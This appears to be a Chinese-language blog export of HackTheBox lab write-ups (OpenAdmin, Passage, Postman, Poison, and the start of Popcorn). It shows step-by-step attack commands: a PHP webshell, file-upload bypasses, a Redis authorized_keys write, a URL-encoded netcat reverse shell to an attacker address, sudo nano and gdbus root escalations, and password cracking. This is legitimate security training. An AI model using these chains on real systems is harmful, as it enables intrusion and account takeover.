    <content><![CDATA[<h1 id="OpenAdmin"><a href="#OpenAdmin" class="headerlink" title="OpenAdmin"></a>OpenAdmin</h1><p>比较简单但典型的机器，可以复习一些常使用的知识</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/OpenAdmin/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>主页没有发现，进行目录枚举</p>
<p><img src="/images/OpenAdmin/2.png" alt="2"></p>
<p>在很多目录下都发现了<code>colorlib</code>，这看起来是一个wordpress的主题，并且没有公开漏洞</p>
<p><img src="/images/OpenAdmin/3.png" alt="3"></p>
<p>继续检查，在<code>/ona</code>发现了<code>openetadmin</code>，并且给出具体的版本</p>
<p><img src="/images/OpenAdmin/4.png" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/OpenAdmin/5.png" alt="5"></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>查看47691.sh</p>
<p><img src="/images/OpenAdmin/6.png" alt="6"></p>
<p>应该是只需要一个HTTP请求完成的RCE，修改它，给curl通过代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -x &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#39;</span><br></pre></td></tr></table></figure>

<p>尝试运行它，会遇到报错</p>
<p><img src="/images/OpenAdmin/7.png" alt="7"></p>
<p>又是一个<code>command not found</code>的问题，是linux的换行符<code>\n</code>的问题</p>
<p><img src="/images/OpenAdmin/8.png" alt="8"></p>
<p>修复它并执行</p>
<p><img src="/images/OpenAdmin/9.png" alt="9"></p>
<p>burp成功抓到了包，可以发送的repeater</p>
<p><img src="/images/OpenAdmin/10.png" alt="10"></p>
<p>成功获得RCE，反弹shell到本地，注意URL编码</p>
<p><img src="/images/OpenAdmin/11.png" alt="11"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>虽然与标注版本不同，但是26682.txt是可以使用的，利用起来稍微麻烦点，阅读理解它比较关键</p>
<p>首先它提供了一个html页面，来生成攻击参数，它会发送至目标的<code>dcm.php</code>来添加一个模块，而且会将模块的路径参数设置为<code>../../../../../../../../../../../var/log/ona.log</code>，之后去访问<code>dcm.php?module=模块名</code>就能获得RCE，看起来有点像LFI污染日志获得RCE的感觉，不过包含的文件地址是通过添加模块地址时注入的，包含的文件直接就是模块名</p>
<p>顺着步骤来</p>
<p>首先获得攻击的payload</p>
<p><img src="/images/OpenAdmin/15.png" alt="15"></p>
<p>修改http请求的参数，并修改burp的target地址</p>
<p><img src="/images/OpenAdmin/14.png" alt="14"></p>
<p>而且可以发现，添加的模块名，叫做<code>mandat0ry</code>，注入的payload是<code>&lt;?php echo shell_exec($_GET[1]) ?&gt;</code>去访问漏洞页面:<a href="http://10.10.10.171/ona/dcm.php?module=mandat0ry">http://10.10.10.171/ona/dcm.php?module=mandat0ry</a></p>
<p><img src="/images/OpenAdmin/16.png" alt="16"></p>
<p>看起来应该是成功包含了日志，发送RCE命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.171&#x2F;ona&#x2F;dcm.php?module&#x3D;mandat0ry&amp;1&#x3D;id</span><br></pre></td></tr></table></figure>

<p>成功获得RCE</p>
<p><img src="/images/OpenAdmin/17.png" alt="17"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现普通用户</p>
<p><img src="/images/OpenAdmin/12.png" alt="12"></p>
<h3 id="jimmy"><a href="#jimmy" class="headerlink" title="jimmy"></a>jimmy</h3><p>常规套路去找ona这个cms的mysql登录凭据，文件比较深，搜索发现比较快:<a href="https://fossies.org/linux/ona/docs/INSTALL">https://fossies.org/linux/ona/docs/INSTALL</a></p>
<p><img src="/images/OpenAdmin/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;opt&#x2F;ona&#x2F;www&#x2F;local&#x2F;config&#x2F;database_settings.inc.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/OpenAdmin/22.png" alt="22"></p>
<p>查招凭据</p>
<p><img src="/images/OpenAdmin/18.png" alt="18"></p>
<p>不过破解出的内容不能切换到普通用户</p>
<p><img src="/images/OpenAdmin/19.png" alt="19"></p>
<p>但是mysql的连接密码可以切换到jimmy <code>n1nj4W4rri0R!</code></p>
<p><img src="/images/OpenAdmin/23.png" alt="23"></p>
<p>虽然知道密码，但是jimmy不在sudo组，有点失望，继续收集信息</p>
<p>发现了一个特殊的web目录，创建者是jimmy</p>
<p><img src="/images/OpenAdmin/20.png" alt="20"></p>
<p>确实是nmap没发现的站点</p>
<p><img src="/images/OpenAdmin/24.png" alt="24"></p>
<p>寻找apache的配置文件，希望找到端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf</span><br></pre></td></tr></table></figure>

<p>上面都没发现，在<code>/etc/apache2/sites-enabled</code>目录下发现了端口号</p>
<p><img src="/images/OpenAdmin/25.png" alt="25"></p>
<p>远程端口转发，22端口不通，换一个就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -R 52846:127.0.0.1:6666 jimmy@10.10.10.171 -p 53</span><br></pre></td></tr></table></figure>

<p>得到要给登录页面</p>
<p><img src="/images/OpenAdmin/26.png" alt="26"></p>
<p>查看该页面的源代码，需要破解这个sha512的密文</p>
<p><img src="/images/OpenAdmin/27.png" alt="27"></p>
<p>破解成功</p>
<p><img src="/images/OpenAdmin/28.png" alt="28"></p>
<p>使用<code>jimmy / Revealed</code>登录</p>
<p>得到密文</p>
<p><img src="/images/OpenAdmin/29.png" alt="29"></p>
<p>这里其实不一定要破解这个sha512，查看<code>main.php</code>，可以得到提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br><span class="line"># Open Admin Trusted</span><br><span class="line"># OpenAdmin</span><br><span class="line">$output &#x3D; shell_exec(&#39;cat &#x2F;home&#x2F;joanna&#x2F;.ssh&#x2F;id_rsa&#39;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don&#39;t forget your &quot;ninja&quot; password&lt;&#x2F;h3&gt;</span><br><span class="line">Click here to logout &lt;a href&#x3D;&quot;logout.php&quot; tite &#x3D; &quot;Logout&quot;&gt;Session</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>首先，非常容易发现，它执行了<code>cat /home/joanna/.ssh/id_rsa</code>，可以推测出<code>joanna</code>在这个端口运行了apache服务</p>
<p>并且当前用户jimmy是<code>/var/www/internal</code>的创建者，拥有W权限，我们可以直接写个webshell到里面</p>
<p><img src="/images/OpenAdmin/30.png" alt="30"></p>
<p>这样，这个webshell的权限就会是joanna，成功完成了用户切换，这里可以确实看见joanna运行了apache</p>
<p><img src="/images/OpenAdmin/32.png" alt="32"></p>
<p>或者这里的PHP代码出现了问题，完全不需要端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;); &#125;; </span><br></pre></td></tr></table></figure>

<p>有对session的判断，如果没有登录成功获得session的话，应该会返回<code>index.php</code>，但是由于漏写了die()或exit()退出程序，导致后面代码继续执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) &#123; header(&quot;Location: &#x2F;index.php&quot;; die); &#125;;</span><br></pre></td></tr></table></figure>

<p>所以直接curl就行</p>
<p><img src="/images/OpenAdmin/31.png" alt="31"></p>
<h3 id="joana"><a href="#joana" class="headerlink" title="joana"></a>joana</h3><p>尝试ssh，发现密钥没加密了</p>
<p><img src="/images/OpenAdmin/33.png" alt="33"></p>
<p>破解它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py &#x2F;root&#x2F;Desktop&#x2F;id_rsa &gt;hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到<code>bloodninjas</code>，这样就能获取shell了</p>
<p><img src="/images/OpenAdmin/35.png" alt="35"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><img src="/images/OpenAdmin/36.png" alt="36"></p>
<p>正常来看，应该是允许使用root权限运行nan编辑<code>/opt/priv</code>，有一个使用sudo下nano进行提权</p>
<p><img src="/images/OpenAdmin/37.png" alt="37"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;nano &#x2F;opt&#x2F;priv</span><br><span class="line">ctrl+r</span><br><span class="line">ctrl+x</span><br><span class="line">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>

<p>获得root</p>
<p><img src="/images/OpenAdmin/38.png" alt="38"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Passage</title>
    <url>/2020/09/08/HTB-Passage/</url>
    <content><![CDATA[<h1 id="Passage"><a href="#Passage" class="headerlink" title="Passage"></a>Passage</h1><p>本周HTB跟新的靶机，尝一波鲜</p>
<p>难度为medium</p>
<p><img src="/images/Passage/1.jpg" alt="1"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Passage/2.jpg" alt="2"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口发现了CuteNews CMS</p>
<p><img src="/images/Passage/3.jpg" alt="3"></p>
<p>接着尝试目录枚举，这里枚举3个后被封ip，看来存在waf<br>那只能进行爬虫，但没有发现有趣的信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>对CuteNewsCMS开始攻击</p>
<p><img src="/images/Passage/4.jpg" alt="4"></p>
<p>由于不知道版本号，按照习惯从高版本漏洞开始测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CuteNews 2.1.2 - &#39;avatar&#39; Remote Code Execution (Metasploit)                                        | php&#x2F;remote&#x2F;46698.rb</span><br><span class="line">CuteNews 2.1.2 - Arbitrary File Deletion                                                            | php&#x2F;webapps&#x2F;48447.txt</span><br><span class="line">CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                | php&#x2F;webapps&#x2F;48458.txt</span><br></pre></td></tr></table></figure>

<p>这里48458.txt和46698.rb都是文件上传，但是细节部分有一些小区别</p>
<p>我们先尝试46698.rb，阅读可以发现它的攻击流程如下</p>
<ol>
<li>用户登录</li>
<li>在修改用户头像处，制作shell并上传，上传过程中有一些绕过操作</li>
<li>webshell路径可以直接获得</li>
</ol>
<p>这个攻击方式看来很高效且简单，我们不需要知道后台管理员的登录凭据，因为是通过头像处上传，我们直接注册一个自己的账号就可以了</p>
<p>按照流程，我们注册账号<code>hackerars/hackerars1337</code>并登录<br>制作shell并上传，bypass方式如下</p>
<p><img src="/images/Passage/5.jpg" alt="5"></p>
<p>修改文件名<br>添加GIF头部</p>
<p><img src="/images/Passage/6.jpg" alt="6"></p>
<p>这样我们的shell就上传成功，并且头像处直接给出了路径</p>
<p><img src="/images/Passage/7.jpg" alt="7"></p>
<p>这样就可以通过webshell获取intial shell了</p>
<p><img src="/images/Passage/8.jpg" alt="8"></p>
<h3 id="方法2-metasploit"><a href="#方法2-metasploit" class="headerlink" title="方法2 metasploit"></a>方法2 metasploit</h3><p>手动既然可以，那么metasploit应该也是可以的<br>导入模块，这里这个模块有一个很简单的问题需要fixing，谷歌即可</p>
<p><img src="/images/Passage/9.jpg" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas.sh扫描，没有发现可以直接获取root的利用<br>在/etc/passwd中发现了其他用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nadav:x:1000:1000:Nadav,,,:&#x2F;home&#x2F;nadav:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1001:1001:Paul Coles,,,:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>看来不能一步到位</p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>思路很明确，既然我们是从web自己注册的账户过来的，那么web中八成有管理员账户并存在凭据<br>搜索发现cutenews不依赖数据库存储，可以部署在任何web环境中，我们就去寻找潜在凭据</p>
<p>这一步消耗了比较长的时间，因为我知道正确的位置，但这里hash有点多，找了一会儿还以为方向错了<br>最终发现hash在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;CuteNews&#x2F;cdata&#x2F;users&#x2F;b0.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/10.jpg" alt="10"></p>
<p>base64解码</p>
<p><img src="/images/Passage/11.jpg" alt="11"></p>
<p>发现了一段序列化数据，并存在一段sha256的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --format&#x3D;raw-sha256 hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/12.jpg" alt="12"></p>
<p>成功破解了凭据<code>atlanta1</code></p>
<p><img src="/images/Passage/13.jpg" alt="13"></p>
<h4 id="确认提权思路"><a href="#确认提权思路" class="headerlink" title="确认提权思路"></a>确认提权思路</h4><p>在检查提权的过程中有所发现</p>
<p><img src="/images/Passage/20.jpg" alt="20"></p>
<p>寻找所有可执行文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;home -type f -perm -111</span><br></pre></td></tr></table></figure>

<p>发现了gdbus</p>
<p><img src="/images/Passage/21.jpg" alt="21"></p>
<p>并寻找到了一篇关于gdbus提权的文章<a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">链接</a></p>
<p><img src="/images/Passage/22.jpg" alt="22"></p>
<p>它需要一个sudo组的成员用户，并可以绕过密码验证，以root身份完成完成任意文件写入，从而达到提权<br>当前用户paul不属于sudo组，我们需要下一个猎物</p>
<p><img src="/images/Passage/23.jpg" alt="23"></p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>这一步需要不断的枚举，linpeas能让你有效避免一些坑，但是不能给你正确的方法</p>
<p>我们在用户主目录里发现了有趣的信息</p>
<p><img src="/images/Passage/14.jpg" alt="14"></p>
<p>确认/etc/ssh/sshd_config</p>
<p><img src="/images/Passage/16.jpg" alt="16"></p>
<p>直接私钥切换用户即可</p>
<p><img src="/images/Passage/15.jpg" alt="15"></p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>这个漏洞可以起到绕过权限限制的作用，因为当前用户属于sudo组，但我们并不知道密码是什么，不过确实调用了root权限</p>
<p><img src="/images/Passage/17.jpg" alt="17"></p>
<p>修改passwd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdbus call --system --dest com.ubuntu.USBCreator --object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator --method com.ubuntu.USBCreator.Image &#x2F;tmp&#x2F;passwd &#x2F;etc&#x2F;passwd true</span><br></pre></td></tr></table></figure>

<p><img src="/images/Passage/19.jpg" alt="19"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Postman</title>
    <url>/2020/10/28/HTB-Postman/</url>
    <content><![CDATA[<h1 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Postman/1.png" alt="1"></p>
<p>发现了redis</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>10000端口发现https，添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.160	postman.htb postman</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/2.png" alt="2"></p>
<p>登陆页面</p>
<p><img src="/images/Postman/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现对方redis版本为4.0.9，在4.0~5.0之间的版本可能会受到未授权访问造成的RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install redis-tools</span><br></pre></td></tr></table></figure>

<p>尝试连接redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160</span><br></pre></td></tr></table></figure>

<p>连接成功，<code>info</code>命令给出了redis的一些信息</p>
<p><img src="/images/Postman/4.png" alt="4"></p>
<p>所以这是一个redis未授权访问</p>
<p>可以找到一篇文章描述了攻击redis的多种方式：<a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p>
<p>先生成rsa密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p>修改一下公钥的格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br></pre></td></tr></table></figure>

<p>将这个公钥文件导入redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/5.png" alt="5"></p>
<p>之后写入的时候需要修改一下，随便写一个位置会没有权限</p>
<p><img src="/images/Postman/6.png" alt="6"></p>
<p>需要找到redis的目录，谷歌可以找到</p>
<p><img src="/images/Postman/7.png" alt="7"></p>
<p>所以需要修改一下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/8.png" alt="8"></p>
<p>这个.ssh目录本身就是存在的，如果随便输一个目录会得到</p>
<p><img src="/images/Postman/9.png" alt="9"></p>
<p>之后就可以ssh连接</p>
<p><img src="/images/Postman/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先发现了用户</p>
<p><img src="/images/Postman/11.png" alt="11"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>这里有些难受，由于80和10000的web端口没有使用过，老想去web目录寻找到一些凭据，但是啥都没有，或者权限不足</p>
<p>最后在linpeas发现，我晕，怎么不换一行显示</p>
<p><img src="/images/Postman/12.png" alt="12"></p>
<p>得到一个ssh私钥文件</p>
<p><img src="/images/Postman/13.png" alt="13"></p>
<p>可以使用john进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py key &gt;hash</span><br><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/14.png" alt="14"></p>
<p>改密码可以切换到Matt</p>
<p><img src="/images/Postman/15.png" alt="15"></p>
<p>这里不能ssh，因为<code>/etc/ssh/sshd_config</code></p>
<p><img src="/images/Postman/16.png" alt="16"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><img src="/images/Postman/17.png" alt="17"></p>
<p>root疑似在运行webmin</p>
<p>回到10000端口，matt的凭据能够登录</p>
<p><img src="/images/Postman/18.png" alt="18"></p>
<p>不过该web目录不可以写，应该不能写个shell之类的</p>
<p><img src="/images/Postman/19.png" alt="19"></p>
<p>搜索公开漏洞有很多</p>
<p><img src="/images/Postman/20.png" alt="20"></p>
<p>现在应该去定位版本</p>
<p><img src="/images/Postman/21.png" alt="21"></p>
<p>1.90有一个msf可以用，别忘了SSL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce </span><br><span class="line">set LhOST tun0</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOSTS 10.10.10.160</span><br><span class="line">set UserNAME Matt</span><br><span class="line">set PasSWORD computer2008</span><br><span class="line">set SSL true</span><br></pre></td></tr></table></figure>

<p><img src="/images/Postman/22.png" alt="22"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Poison</title>
    <url>/2020/06/25/HTB-Poison/</url>
    <content><![CDATA[<h1 id="Poison"><a href="#Poison" class="headerlink" title="Poison"></a>Poison</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/poison/1.jpg" alt="1"></p>
<p>发现了22和80两个端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80页面如下</p>
<p><img src="/images/poison/2.jpg" alt="2"></p>
<p>看提示应该是1个本地文件包含</p>
<p><img src="/images/poison/3.jpg" alt="3"></p>
<p>发现的确存在本地文件包含<br>再尝试页面提示的文件看看</p>
<p><img src="/images/poison/4.jpg" alt="4"></p>
<p>在listfiles.php里发现了提示，pwdbackup.txt，尝试包含</p>
<p><img src="/images/poison/5.jpg" alt="5"></p>
<p>页面经过base64编码，而且提示编码了13次</p>
<p>解密之后就可以得到密码<code>Charix!2#4%6&amp;8(0</code><br>这样就可以登录ssh</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>我们可以使用另一种方法进行渗透<br>可以尝试使用<code>php://</code>进行截断，读取网页源码，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/6.jpg" alt="6"></p>
<p>再进行解码即可</p>
<p><img src="/images/poison/7.jpg" alt="7"></p>
<p>不过似乎没啥大的发现</p>
<h3 id="phpinfo-race-condition-Getshell"><a href="#phpinfo-race-condition-Getshell" class="headerlink" title="phpinfo+race condition Getshell"></a>phpinfo+race condition Getshell</h3><p>漏洞说明:<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a><br>漏洞exp:<a href="https://raw.githubusercontent.com/vulhub/vulhub/master/php/inclusion/exp.py">https://raw.githubusercontent.com/vulhub/vulhub/master/php/inclusion/exp.py</a></p>
<p>受限观察phpinfo信息，可以发现</p>
<p><img src="/images/poison/8.jpg" alt="8"></p>
<p>无法使用RFI，但是可以文件上传</p>
<p>尝试使用文件上传，构造HTTP包</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/phpinfo.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.10.10.84</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=--EOF</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line">----EOF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: from-data; name=&quot;test&quot;; filename=&quot;eviltest&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">this is simple test</span><br><span class="line">----EOF</span><br></pre></td></tr></table></figure>

<p>发现文件成功上传</p>
<p><img src="/images/poison/9.jpg" alt="9"></p>
<p>再次刷新，发现缓存已经没了，可以确认存在竞争关系</p>
<p><img src="/images/poison/10.jpg" alt="10"></p>
<p>修改exp的文件包含，改成如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LFIREQ&#x3D;&quot;&quot;&quot;GET &#x2F;browse.php?file&#x3D;%s HTTP&#x2F;1.1\r</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/11.jpg" alt="11"></p>
<p>成功写入了木马<br>可以RCE</p>
<p><img src="/images/poison/12.jpg" alt="12"></p>
<p>反弹shell，对payload进行url编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%39%39%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/13.jpg" alt="13"></p>
<p>成功获取shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在主目录下发现了secret.zip</p>
<p><img src="/images/poison/16.jpg" alt="16"></p>
<p>传送过来进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp charix@10.10.10.84:&#x2F;home&#x2F;charix&#x2F;secret.zip &#x2F;root&#x2F;Desktop&#x2F;secret.zip</span><br><span class="line">Charix!2#4%6&amp;8(0</span><br></pre></td></tr></table></figure>

<p>解压密码就是Charix!2#4%6&amp;8(0，解压完成后发现一些乱码</p>
<p>发现root正在运行VNC</p>
<p><img src="/images/poison/14.jpg" alt="14"></p>
<p>不过vnc在监听本地端口</p>
<p><img src="/images/poison/15.jpg" alt="15"></p>
<p>利用ssh隧道转发出去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -L 9999:127.0.0.1:5901 charix@10.10.10.84</span><br><span class="line">Charix!2#4%6&amp;8(0</span><br></pre></td></tr></table></figure>

<p>再访问本地隧道开口9999</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vncviewer 127.0.0.1::9999 -passwd &#x2F;root&#x2F;Desktop&#x2F;secret</span><br></pre></td></tr></table></figure>

<p><img src="/images/poison/17.jpg" alt="17"></p>
<p>成功获取root会话</p>
<p>之后用passwd给root改个密码，ssh过去，就不用vnc了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Popcorn</title>
    <url>/2020/10/19/HTB-Popcorn/</url>
    <content><![CDATA[<h1 id="Popcorn"><a href="#Popcorn" class="headerlink" title="Popcorn"></a>Popcorn</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Popcorn/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Popcorn/2.png" alt="2"></p>
<p>发现了test.php为phpinfo，但是没有得到太多信息</p>
<p><img src="/images/Popcorn/4.png" alt="4"></p>
<p>发现了<code>Torrent Hoster</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索漏洞</p>
<p><img src="/images/Popcorn/3.png" alt="3"></p>
<p>是一个文件上传，但是路径不对</p>
<p>尝试手动挖掘</p>
<p>尝试搜索默认登录凭据和常见弱口令，失败。不过页面提供了注册功能</p>
<p>找到了一处上传点</p>
<p><img src="/images/Popcorn/5.png" alt="5"></p>
<p>不过好像无法绕过</p>
<p><img src="/images/Popcorn/6.png" alt="6"></p>
<p>所以选择乖乖上传一个torrent文件，看看后续。直接上传收藏多年的torrent过去</p>
<p>之后又会发现一个上传点，看似是修改torrent的图标的，理论上如果上传成功，可以直接得到上传路径</p>
<p><img src="/images/Popcorn/7.png" alt="7"></p>
